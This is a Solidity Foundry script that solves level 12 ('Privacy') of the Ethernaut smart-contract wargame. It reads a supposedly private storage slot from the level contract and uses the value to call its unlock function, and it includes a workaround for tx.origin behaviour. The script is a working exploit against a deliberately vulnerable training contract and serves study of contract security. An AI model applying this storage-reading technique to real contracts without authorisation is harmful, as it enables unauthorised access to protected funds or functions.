// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import "./SolveLevelBase.sol";
import "../src/interfaces/IPrivacy.sol";
import "../src/exploits/PublicPrivacy.sol";

contract SolveLevel12 is SolveLevelBase {
    using stdStorage for StdStorage;

    function getInstanceCreationData()
        internal
        pure
        override
        returns (address levelAddress, uint256 value)
    {
        levelAddress = 0x1ca9f1c518ec5681C2B7F97c7385C0164c3A22Fe;
        value = 0;
    }

    function solveLevel(address instanceAddress, address player)
        internal
        override
    {
        IPrivacy instance = IPrivacy(instanceAddress);
        // This contract has the same storage layout as the Privacy instance
        // but all storage variables are made public so it works with stdStorage.
        // Its only purpose is to calculate the storage slot for data[2] with stdstore
        // instead of manually.
        PublicPrivacy publicPrivacy = new PublicPrivacy();

        uint256 slot = stdstore
            .target(address(publicPrivacy))
            .sig("data(uint256)")
            .with_key(uint256(2))
            .find();

        bytes32 data2 = vm.load(address(instance), bytes32(uint256(slot)));
        // bytes16(data2) should be the correct key.
        // However data[2] is set using tx.origin when creating the Privacy instance
        // https://github.com/OpenZeppelin/ethernaut/blob/master/contracts/contracts/levels/PrivacyFactory.sol
        // tx.origin seems to be handled in an unexpected way by forge script
        // tx.origin is the player address when submitting the transactions to actual Mumbai network
        // but when generating transactions to send to the actual network it's something else.
        console.logBytes32(data2);
        console.logBytes32(keccak256(abi.encodePacked(tx.origin, "2")));
        console.logBytes32(keccak256(abi.encodePacked(player, "2")));
        console.log("player:", player);
        console.log("tx.origin:", tx.origin);

        // For now, let's use the following workaround:
        address(instance).call(
            abi.encodeWithSelector(
                instance.unlock.selector,
                bytes16(keccak256(abi.encodePacked(player, "2")))
            )
        );
    }

    function solveLevelIntendedSolution(address instanceAddress, address player)
        internal
    {
        IPrivacy instance = IPrivacy(instanceAddress);
        // This contract has the same storage layout as the Privacy instance
        // but all storage variables are made public so it works with stdStorage.
        // Its only purpose is to calculate the storage slot for data[2] with stdstore
        // instead of manually.
        PublicPrivacy publicPrivacy = new PublicPrivacy();

        uint256 slot = stdstore
            .target(address(publicPrivacy))
            .sig("data(uint256)")
            .with_key(uint256(2))
            .find();

        bytes32 data2 = vm.load(address(instance), bytes32(uint256(slot)));
        instance.unlock(bytes16(data2));
    }
}
